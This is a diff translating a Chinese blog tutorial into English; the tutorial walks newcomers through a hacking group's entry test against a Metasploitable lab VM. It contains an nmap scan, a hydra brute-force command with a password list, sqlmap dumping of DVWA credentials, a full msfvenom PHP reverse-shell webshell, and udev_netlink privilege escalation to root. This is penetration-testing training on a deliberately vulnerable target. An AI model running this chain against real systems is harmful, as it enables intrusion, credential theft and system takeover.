@@ -1,137 +1,147 @@
-# 锏幕 新人测试教程
+# JianMu Newcomer Test Tutorial
 
 
-**注意事项：本期内容中的IP地址可能与你的实际情况不同！！请根据实际情况更改对应IP地址！！**
+**Note: The IP addresses in this article may differ from your actual situation!! Please modify the corresponding IP addresses based on your actual environment!!**
 
-## 开场白
+<!--more-->
+## Opening Remarks
 
-诶嘿～！我又回来了，我看到很多萌新不知道怎么过锏幕的新人测试，特意为此写篇博客做个教程。
+Ehehe~! I'm back again. I've seen many newcomers who don't know how to pass the JianMu newcomer test, so I wrote this blog post as a tutorial.
 
-好让你们看完过一下，那么…
+So you can read through it and pass...
 
-嘛.. 我们开始吧..
-## 考核内容
-|类型|内容|备注|
+Well... let's get started.
+
+## Test Content
+
+| Type | Content | Notes |
 |:-:|:-|:-|
-|名称|锏幕四项萌新考核 |考核的名称|
-|难度|Low|难度系数|
-|第一关|简单破解Web表单|必须通过，否则无法进行下一关|
-|第二关|简单SQL注入|必须通过|
-|第三关|操作系统渗透|必须通过|
-|第四关|获取root权限|必须通过|
+| Name | JianMu Four-Task Newcomer Assessment | The name of the test |
+| Difficulty | Low | Difficulty level |
+| Level 1 | Simple Web Form Cracking | Must pass, otherwise cannot proceed to the next level |
+| Level 2 | Simple SQL Injection | Must pass |
+| Level 3 | Operating System Penetration | Must pass |
+| Level 4 | Obtain Root Privileges | Must pass |
 
-**PS：锏幕组织的新人考核是以metasploitable作为标准的，因此我会写出如何准备环境**
+**PS: The JianMu organization's newcomer assessment uses metasploitable as the standard, so I will explain how to prepare the environment.**
 
-## 环境准备
+## Environment Preparation
 
-上面已经说明了需要用到**metasploitable**，那么接下来我会写出如何配置靶机环境
-### 第一步|下载&解压
+As mentioned above, you'll need **metasploitable**. Next, I'll explain how to set up the target machine environment.
 
-首先我们需要去下载metasploitable这个靶机套餐的虚拟机文件，我们可以在各种搜索引擎中找到它我这里会给出地址。
+### Step 1 | Download & Extract
 
-[点击这里可以下载](https://sourceforge.net/projects/metasploitable/)
+First, we need to download the metasploitable target machine virtual machine files. You can find it in various search engines, but I'll provide the address here.
 
-点进去以后点击那个巨大的**Download**即可下载。
+[Click here to download](https://sourceforge.net/projects/metasploitable/)
 
-嘛..我已经下载好了，是个**zip**文件。
+Once you're there, click the big **Download** button to start downloading.
 
-然后你需要解压，两种方法:
+Well... I've already downloaded it. It's a **zip** file.
+
+Then you need to extract it. Two methods:
 
 * Linux
-  * unzip命令
-  * file-roller(GUI)
+  * `unzip` command
+  * file-roller (GUI)
 * Windows
-  * 各种解压软件
+  * Various extraction software
 
-这个不用多说吧..
+I shouldn't need to explain this...
 
-**解压个东西都不会还想加入锏幕?**
+**You can't even extract a file and you want to join JianMu?**
 
 ![](/img/截图_2019-10-20_05-52-55.png)
 
-解压完了就可以进行下一步了。
+After extraction, you can proceed to the next step.
 
-### 第二步|创建虚拟机
+### Step 2 | Create a Virtual Machine
 
-你打开文件夹就可以看到这里面有个虚拟机配置文件和一个虚拟硬盘文件，它可以直接用VMware导入运行，因此我这里给出VirtualBox的方法
+When you open the folder, you'll see a virtual machine configuration file and a virtual hard disk file. It can be directly imported and run with VMware, so I'll provide the method for VirtualBox here.
 
-首先，打开你的VirtualBox
+First, open your VirtualBox.
 
 ![](/img/截图_2019-10-20_05-58-44.png)
 
-然后点击上面的新建…(这个还要教吗?)
+Then click "New" at the top... (Do I really need to teach this?)
 
 ![](/img/截图_2019-10-20_05-59-53.png)
 
-然后选择的虚拟机类型和操作系统版本，**这里要注意！！必须选“64位的其他Linux”，并且设置至少256MB的内存！否则无法启动！**
+Then select the virtual machine type and OS version. **Important!! You must select "Other Linux (64-bit)" and set at least 256MB of memory! Otherwise, it won't start!**
+
 ![](/img/截图_2019-10-20_06-00-34.png)
 
 ![](/img/截图_2019-10-20_06-02-10.png)
 
-然后这里就**不用创建虚拟硬盘**了，我们选择**使用现有的虚拟硬盘文件**。
+Then **don't create a new virtual hard disk**. Instead, select **"Use an existing virtual hard disk file"**.
 
 ![](/img/截图_2019-10-20_06-04-29.png)
 
-点击这个东西，
+Click this button.
 
 ![](/img/截图_2019-10-20_06-05-21.png)
 
-然后点击**注册**
+Then click **"Register"**.
 
 ![](/img/截图_2019-10-20_06-07-17.png)
 
-找到你的**metasploitable**目录并且找到这个**vmdk文件**，这个就是虚拟硬盘文件。
+Find your **metasploitable** directory and locate this **vmdk file**—that's the virtual hard disk file.
 
 ![](/img/截图_2019-10-20_06-08-57.png)
 
-点击打开，然后就会回到这个窗口，选择你刚刚注册的虚拟硬盘。
+Click "Open", and you'll return to this window. Select the virtual hard disk you just registered.
 
 ![](/img/截图_2019-10-20_06-11-10.png)
 
-接下来就可以创建了
+Now you can create it.
 
 ![](/img/截图_2019-10-20_06-12-03.png)
 
-**在启动之前要把虚拟机的联网改成桥接**
+**Before starting, change the virtual machine's network to bridged mode.**
 
-**依次点击设置——网络**
+**Go to Settings → Network**
 
-然后就会跳出这个页面
+Then this page will appear.
 
 ![](/img/截图_2019-10-20_06-16-46.png)
 
-将它改成桥接网卡即可
+Change it to "Bridged Adapter".
 
 ![](/img/截图_2019-10-20_06-17-25.png)
 
-最后启动虚拟机，你的靶机环境就搭建完成了。
+Finally, start the virtual machine. Your target environment is now set up.
+
 ![](/img/截图_2019-10-20_06-12-40.png)
 ![](/img/截图_2019-10-20_06-18-39.png)
 
-开机之后**不要去操作靶机**也**不要去理会它**
+After booting, **don't touch the target machine** and **don't pay any attention to it**.
 
 ![](/img/截图_2019-10-20_06-19-35.png)
 
-## 考核过程
+## The Assessment Process
 
-现在环境已经准备完毕了，我们可以开始进行过关了。接下来请**认真看！认真看！认真看！**（重要的事情说三遍）
-### 嗅探！扫描！
+Now that the environment is ready, we can start the challenges. Please **pay close attention! Pay close attention! Pay close attention!** (Important things said three times.)
 
-我们刚刚搭建完靶机却不知道它的**IP地址**，这意味着我们不知道**它的位置**，那么怎么办呢？这个时候我们要用到**nmap**把他扫出来。
+### Sniffing! Scanning!
 
-不过前提是首先你得知道你所处的IP段，我的环境是局域网，DHCP地址段是`192.168.0.1/24`
+We've just set up the target machine but don't know its **IP address**, meaning we don't know **where it is**. So what do we do? We'll use **nmap** to scan for it.
 
-执行
+First, you need to know your own IP subnet. My environment is a LAN with a DHCP range of `192.168.0.1/24`.
+
+Run:
+
 ```bash
 $ sudo nmap -v -O 192.168.0.1/24
-![](/img/截图_2019-10-20_06-27-08.png)
 ```
 
-可以发现它很快就扫出来了
+![](/img/截图_2019-10-20_06-27-08.png)
+
+It quickly finds it:
 
 ![](/img/截图_2019-10-20_06-31-32.png)
 
-终端里获取到的信息如下，说明这个192.168.0.107就是靶机的地址
+The information from the terminal is as follows, showing that 192.168.0.107 is the target machine's address:
+
 ```txt
 Nmap scan report for 192.168.0.107
 Host is up (0.00028s latency).
@@ -171,71 +181,71 @@ TCP Sequence Prediction: Difficulty=192 (Good luck!)
 IP ID Sequence Generation: All zeros
 ```
 
-那么我已经找到靶机了，接下来就可以正式进行攻击了。
-### 第一关|简单破解Web表单
+Now I've found the target machine. Let the attack begin.
 
-接下来我们在浏览器输入刚刚扫描到的地址，就可以进入靶机上的网页了。
+### Level 1 | Simple Web Form Cracking
+
+Next, enter the IP address we just scanned in your browser to access the target machine's webpage.
 
 ![](/img/截图_2019-10-20_06-41-20.png)
 
-> 小白：唔？为什么你的IP不是上面写的107了，变成4了
+> Newbie: "Huh? Why is your IP not 107 anymore, it changed to 4?"
 >
-> 回答：我写着写着就断网了，搭建了一个虚拟局域网，所以靶机IP变了，又重新扫了一遍。。但是正常情况下，这个IP是不会变的，所以请无视这个地址具体是多少了，每个人都不一样的。
->
+> Answer: "I lost internet connection while writing this, so I set up a virtual LAN. The target machine's IP changed, and I had to scan again... But under normal circumstances, this IP won't change, so ignore whatever the specific address is—everyone's will be different."
 
-接下来我们点击**DVWA**，进入了一个这样的帐号密码登录页面，我们第一关的目的就是破解它。
+Now click on **DVWA**. You'll see a login page asking for a username and password. Our goal for the first level is to crack it.
 
 ![](/img/截图_2019-10-20_06-45-23.png)
 
-QwQ，然后..是不是到这里就一脸懵逼了
+QwQ... And now you're probably confused, right?
 
-#### 抓包
+#### Packet Capture
 
-嘛，记得**Burpsuite**吗？
+Well, remember **Burpsuite**?
 
-就是一个java写的软件
+It's a Java-based tool.
 
 ![](/img/截图_2019-10-20_06-51-38.png)
 
-试试？
+Want to give it a try?
 
-在使用Burpsuite之前，你需要给浏览器设置burp的代理，我这里使用的是firefox
+Before using Burpsuite, you need to set the browser's proxy to Burp's. I'm using Firefox here.
 
-那么，在burpsuite里面依次点击
+In Burpsuite, click:
 
-`Proxy（左上角内个）——Options`
+`Proxy (top left) → Options`
 
 ![](/img/截图_2019-10-20_06-56-54.png)
 
-从这里我们就获得了burp默认的代理地址`127.0.0.1:8080`
+From here, we get Burp's default proxy address: `127.0.0.1:8080`
 
-接下来要到浏览器里设置它，
+Next, set it up in your browser.
 
-简单地给出截图吧
+I'll just provide screenshots for brevity.
 
 ![](/img/截图_2019-10-20_07-02-05.png)
 
 ![](/img/截图_2019-10-20_07-03-59.png)
 
-然后点确定，就这样设置好了
+Then click OK, and it's set up.
 
-嘛…**浏览器都不会用**的也别来锏幕了
+Well... **if you can't even use a browser**, don't bother coming to JianMu.
 
-然后回到burp，确认一下这个**Intercept**是否为**on**，如果是就进行下一步操作，如果不是就点一下。。。
+Now go back to Burp and make sure **Intercept** is set to **on**. If it is, proceed to the next step. If not, click it...
 
 ![](/img/截图_2019-10-20_07-06-34.png)
 
-接下来，回到浏览器
+Now, back to the browser.
 
 ![](/img/截图_2019-10-20_07-09-10.png)
 
-emmmm….我们知道一般网站的默认管理员帐号都是**admin**，这里也不例外，接下来我们试着在Username这个框框里输入`admin`，**Password**这个框框里随便输入点什么
+Emmm... We know that the default admin account for most websites is **admin**, and it's no different here. Let's try entering `admin` in the **Username** field and whatever we want in the **Password** field.
 
 ![](/img/截图_2019-10-20_07-11-43.png)
 
-然后点击**login**。
+Then click **Login**.
 
-接下来我们就抓取到了这个数据包了，下面还有我输入过的信息
+Now we've captured this packet. Below you can see the information I entered.
 
 ![](/img/截图_2019-10-20_07-13-04.png)
 
@@ -256,53 +266,55 @@ Upgrade-Insecure-Requests: 1
 username=admin&password=6666666666&Login=Login
 ```
 
-嘛…这么一大堆看着都头晕
+Well... that's a lot to look at—it'll make you dizzy.
 
-诶嘿，其实这里你只需要保存这一部分就可以了
+Ehehe~ Actually, you only need to save this part:
 
 ```txt
 username=admin&password=6666666666&Login=Login
 ```
 
-嘛，上面这点还不够呢，还需要获取一段信息。
+But that's not enough yet. We still need one more piece of information.
 
-现在网页看起来像时间停止了一样一动不动的对不对？
+Now the webpage looks frozen, right?
 
-那么我来解释一下burp这里三个按钮的意思
+Let me explain what the three buttons in Burp do:
 
-* Forward:放行，让网页继续执行抓到的数据包
-* Drop:丢弃，将这个数据包扔了，网页就执行不了了
+* **Forward**: Let the packet through so the webpage continues executing
+* **Drop**: Discard the packet, so the webpage won't execute
 
-现在，我们点击`Forward`，放行这个数据包
+For now, click **Forward** to release this packet.
 
-这时，网页下面弹出了一段字符串
+At this point, a string appeared at the bottom of the webpage.
 
 ![](/img/截图_2019-10-20_07-26-23.png)
 
-码下来，一会儿要用到的
+Write it down—you'll need it later.
 
 ```txt
 Login failed
 ```
 
-接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。
+Now turn off Burpsuite and disable the browser proxy. I won't go into detail on the steps.
 
-嗯…整个抓包的过程就完成了。然后就是进行**爆破**了
+Alright, the packet capture process is complete. Now it's time for **brute-forcing**.
 
-#### 爆破
+#### Brute Forcing
 
-嘛…最精彩的部分来了
+Well... here comes the best part.
 
-你知道**hydra**吗？如果不知道那么请出门左转用搜索引擎查一下。
+Do you know **hydra**? If not, go search for it with a search engine.
 
-我们要给hydra设置这么几个参数
+We need to set these parameters for hydra:
 
-* -l + 用户名 : 这个是设置需要破解的用户名，我们尝试admin
-* -P 密码字典 : 指定一个txt文件，里面都是依次猜测需要的密码
-* -V : 显示详细过程
-* -n es : 尝试空口令登录
-* IP地址 : 也就是目标的地址咯，上面的`192.168.0.4`
-* http-post-form : 指定爆破类型，后面还要加爆破的页面地址，这里是http的post页面 没有密码字典？我这里提供一个，你自己复制进一个txt文件里就可以了。
+* `-l` + username: Sets the username we want to crack. We'll try `admin`.
+* `-P` password dictionary: Specifies a txt file containing passwords to try.
+* `-V`: Shows detailed output.
+* `-e ns`: Try null password and login as password.
+* IP address: The target's address, like `192.168.0.4` above.
+* `http-post-form`: Specifies the bruteforce type, followed by the page address for the POST request.
+
+Don't have a password dictionary? Here, I'll provide one. Just copy it into a txt file.
 
 ```txt
 123456
@@ -679,63 +691,66 @@ idc123
 gedingfeng1102888
 ```
 
-以及你需要把上面抓到的`username=admin&password=6666666666&Login=Login`和`Login failed`整合一下变成这样:
+And you need to combine the captured `username=admin&password=6666666666&Login=Login` and `Login failed` into this format:
 
 ```txt
 username=^USER^&password=^PASS^&Login=Login:Login failed
 ```
 
-整合一下，需要执行的指令就是下面这个了
+Putting it all together, the command you need to execute is:
 
 ```bash
-$ hydra -l admin -P ./密码字典/pass-wake.txt -V -e ns 192.168.0.4 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+$ hydra -l admin -P ./passwords/pass-wake.txt -V -e ns 192.168.0.4 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
 ```
 
-它很快就会给你破解出来
+It will crack it quickly.
 
 ![](/img/截图_2019-10-20_07-49-15.png)
 
 ![](/img/截图_2019-10-20_07-50-18.png)
 
-由上图可看出，密码就是`password`
+From the image above, we can see the password is `password`.
 
-接下来我们尝试登录
+Now let's try to log in.
 
 ![](/img/截图_2019-10-20_07-51-58.png)
 
-如果成功登录，出现了这个页面，那么恭喜你，第一关完美通过
+If the login is successful and you see this page, congratulations—you've passed the first level!
+
 ![](/img/截图_2019-10-20_07-54-11.png)
 
-### 第二关|简单SQL注入
+### Level 2 | Simple SQL Injection
 
-第一关过了以后，我们要看看它的数据库里面有什么
+After passing the first level, we need to see what's in its database.
 
-#### 抓包
+#### Packet Capture
 
-我们回到他这个网页，先进入`DVWA Security`，把安全等级改成`Low`
+Go back to the webpage, enter `DVWA Security`, and change the security level to `Low`.
 
 ![](/img/截图_2019-11-03_13-11-42.png)
 
-再点击`SQL Injection`这个按钮，进入这个页面。
+Then click the `SQL Injection` button to enter this page.
 
 ![](/img/截图_2019-11-03_12-55-19.png)
 
-接下来打开burp，按照之前的操作一样，监听，抓包什么的（这里我上面写得很详细了）
+Now open Burp, and follow the same steps as before—monitoring, capturing packets, etc. (I explained this in detail above.)
 
-在burpsuite的监听下，在这个输入框里随便输入一些内容，然后点击这个`Submit`按钮，Burp就会自动抓包了
+With Burpsuite listening, enter something in this input field and click the `Submit` button. Burp will automatically capture the packet.
 
 ![](/img/截图_2019-11-03_13-12-22.png)
 
-将它保存为一个txt文件，但是要记住它的位置，比如我的是`~/get.txt`
+Save it as a txt file, but remember where it is. For example, mine is at `~/get.txt`.
 
 ![](/img/截图_2019-11-03_12-58-29.png)
 
-这样抓包工作就完成了。
-#### 使用sqlmap注入
+The packet capture is done.
 
-接下来用到的工具就是sqlmap了，这里只写出注入的流程，具体的教程请参考由帝的视频
+#### Using sqlmap for Injection
 
-我们先扫描一下注入点
+The tool we'll use is sqlmap. I'll only describe the injection process here. For a detailed tutorial, please refer to YouDi's videos.
+
+Let's first scan for injection points:
+
 ```bash
 $ sqlmap -r "get.txt"
 ```
@@ -744,15 +759,16 @@ $ sqlmap -r "get.txt"
 
 ![](/img/截图_2019-11-03_13-18-06.png)
 
-这里均选`y`即可。
+Choose `y` for both of these.
 
 ![](/img/截图_2019-11-03_13-18-59.png)
 
-最后一个选项选`n`不必浪费时间了。
+For the last option, choose `n`—no need to waste time.
 
 ![](/img/截图_2019-11-03_13-19-51.png)
 
-接下来我们就获得我们需要的信息了，数据库版本什么的。我把它贴出来吧。
+Next, we get the information we need—the database version, etc. Let me paste it here:
+
 ```txt
 sqlmap identified the following injection point(s) with a total of 149 HTTP(s) requests:
 ---
@@ -778,7 +794,7 @@ back-end DBMS: MySQL >= 4.1
 [13:19:30] [INFO] fetched data logged to text files under '/home/weepingdogel/.sqlmap/output/192.168.0.105'
 ```
 
-接下来我们就要查看数据库里面的内容了，由于原因，我就不贴出逐级查看的代码了，我直接dump
+Next, we need to look at the contents of the database. For brevity, I won't show the step-by-step navigation commands—I'll just dump it directly:
 
 ```bash
 $ sqlmap -r "~/get.txt" --dump
@@ -786,9 +802,9 @@ $ sqlmap -r "~/get.txt" --dump
 
 ![](/img/截图_2019-11-03_13-26-48.png)
 
-出来了。
+There it is.
 
-如果你终端里获取到了以下信息，那么说明，第二关通过了
+If your terminal outputs the following information, you've passed the second level:
 
 ```txt
 Database: dvwa
@@ -805,19 +821,19 @@ Table: users
 +---------+---------+-------------------------------------------------------+---------------------------------------------+-----------+------------+
 ```
 
-### 第三关|操作系统渗透
+### Level 3 | Operating System Penetration
 
 Well,
 
-接下来我们就要进行最关键的一环了，我们将使用Webshell的方式入侵靶机的操作系统。
+Now it's time for the most critical part. We'll use a webshell to penetrate the target machine's operating system.
 
-知道PHP吗？我对它了解也不是很多，总之它可以被上传到服务器然后以可执行文件的方式运行。
+Do you know PHP? I don't know much about it either, but it can be uploaded to a server and executed like an executable file.
 
-这次也将使用PHP文件作为**木马**进行攻击。
+This time, we'll also use a PHP file as a **trojan** for the attack.
 
-#### 生成木马
+#### Generating the Trojan
 
-我们用 **`msfvenom`** 这个命令来生成。执行
+We'll use the **`msfvenom`** command to generate it. Run:
 
 ```bash
 $ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -o test.php
@@ -825,14 +841,15 @@ $ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -o test
 
 ![](/img/截图_2019-11-03_13-35-25.png)
 
-这样就生成好了。来看看里面有什么？
+It's generated. Let's see what's inside:
+
 ```php
 /*<?php /**/ error_reporting(0); $ip = '192.168.0.106'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
-只有一行～！这一行就是嘿嘿。。。自己看啦
+Just one line! That line is hehe... figure it out yourself.
 
-我们加一些html上去吧:
+Let's add some HTML to it:
 
 ```php
 /*<?php /**/ error_reporting(0); $ip = '192.168.0.106'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();?>
@@ -844,37 +861,37 @@ $ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -o test
 <h1>Hacked</h1>
 </body>
 </html>
-
 ```
-接下来回到DVWA，在左下角点击 **`upload`** 进入上传页面，然后点击 **`选择文件`** 再点击 **`upload`** 即可。
 
-将这个文件上传进去。
+Now go back to DVWA, click **`Upload`** in the bottom left corner to go to the upload page, then click **`Choose File`** and **`Upload`**.
 
-如果这都不会我就不多说了，**你连上传个文件都不会还想进锏幕？**
+Upload this file.
+
+If you can't do this, I won't say much more—**you can't even upload a file and you want to join JianMu?**
 
 ![](/img/截图_2019-11-03_13-42-57.png)
 
-然后我们可以看到这么一串东西。
+Then we'll see something like this:
 
 **`../../hackable/uploads/test.php succesfully uploaded!`**
 
-说明你上传成功了，接下来要用到**msf**
+This means the upload was successful. Next, we'll use **msf**.
 
-我们在终端进入msf:
+Open msf in the terminal:
 
 ```bash
 $ sudo msfconsole
 ```
 
-不多讲了，走个命令流程，之前写过
+I won't go into too much detail. Just follow the command flow—I've written about it before.
 
-调用模块:
+Load the module:
 
 ```bash
 msf5 > use exploit/multi/handler
 ```
 
-按顺序执行:
+Execute in order:
 
 ```bash
 msf5 exploit(multi/handler) > set lhost 192.168.0.106
@@ -892,63 +909,64 @@ msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
 msf5 exploit(multi/handler) > run
 ```
 
-执行完后，如图:
+After executing, as shown:
 
 ![](/img/截图_2019-11-03_13-54-05.png)
 
-接下来，我们会到浏览器，直接访问`http://192.168.0.105/dvwa/hackable/uploads/test.php`
+Now go back to the browser and directly visit `http://192.168.0.105/dvwa/hackable/uploads/test.php`.
 
-这时，msf会收到反弹，如图:
+At this point, msf will receive the reverse connection, as shown:
 
 ![](/img/截图_2019-11-03_13-58-26.png)
 
 ![](/img/截图_2019-11-03_13-58-47.png)
 
-可见权限小得可怜，不过也第三关就这样通过了。权限的问题我们会在第四关解决
+As you can see, the permissions are pathetically low. But you've still passed the third level. We'll handle the permissions issue in the fourth level.
 
-### 第四关|获取root权限
+### Level 4 | Obtain Root Privileges
 
-你能做到这里说明你已经不是萌新了，最后一关：提权
+If you've made it this far, you're no longer a beginner. The last level: Privilege Escalation.
 
-这是最关键的一环，那么我们开始吧。
+This is the most critical part. Let's get started.
 
-首先把我们刚刚获取的webshell放到后台:
+First, put the webshell we just got into the background:
 
 ```
 meterpreter > background
 ```
 
-然后我们使用这个模块`exploit/linux/local/udev_netlink`(用别的也可以，我个人喜欢用这个:)
+Then we'll use the module `exploit/linux/local/udev_netlink` (you can use others too, but I personally like this one).
 
 ```bash
 msf5 exploit(multi/handler) > use exploit/linux/local/udev_netlink
 ```
 
-模块的信息你可以自己输入 **`info`** 这个命令去查看，
+You can enter the **`info`** command to view the module's details.
 
-然后我们设置刚刚webshell的session号，我的是2:
+Then set the session number of the webshell we just had. Mine is 2:
 
 ```bash
 msf5 exploit(linux/local/udev_netlink) > set SESSION 2
 ```
 
-最后执行 **`run`** 或者 **`exploit`** :
+Finally, execute **`run`** or **`exploit`**:
 
 ```bash
 msf5 exploit(linux/local/udev_netlink) > exploit
 ```
 
-这样我们就获取到最高权限了，如图:
+This will give us the highest level of privileges, as shown:
 
 ![](/img/截图_2019-11-03_14-07-51.png)
 
-我们来看看用户是不是root
+Let's check if the user is root:
 
 ```
 meterpreter > getuid
 ```
 
-或
+Or:
+
 ```
 meterpreter > shell
 ```
@@ -957,28 +975,28 @@ meterpreter > shell
 whoami
 ```
 
-如图
+As shown:
 
 ![](/img/截图_2019-11-03_14-09-15.png)
 
-然后，我们就通过了第四关，同时也通过了全部考核，接下来只要取证和提交截图就可以成为锏幕核心成员了。
+Now you've passed the fourth level, and with it, the entire assessment. All that's left is to document evidence and submit screenshots to become a core member of JianMu.
 
 ---
 
-## 结语
+## Conclusion
 
-写了一个礼拜，全是即操作即写
+I wrote this over the course of a week, documenting as I went.
 
-看完还不会的，，，在下面留言吧..
-## 参考链接
+If you still can't do it after reading this... leave a comment below.
+
+## Reference Links
 
 * [ArchWiki](https://wiki.archlinux.org/index.php/Main_page_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87))
 
-* [Metasploitable下载地址](https://sourceforge.net/projects/metasploitable/)
+* [Metasploitable Download](https://sourceforge.net/projects/metasploitable/)
 
-* [由帝的sqlmap视频](https://www.bilibili.com/video/av59729967)
+* [YouDi's sqlmap Video](https://www.bilibili.com/video/av59729967)
 
 ---
 
-**注意：转载请注明出处，禁止用本博客去干一些作死的事情，否则后果自负，与我无关**
-
+**Note: Please indicate the source when reprinting. Do not use this blog to do anything reckless. Otherwise, you will bear the consequences yourself—it has nothing to do with me.**
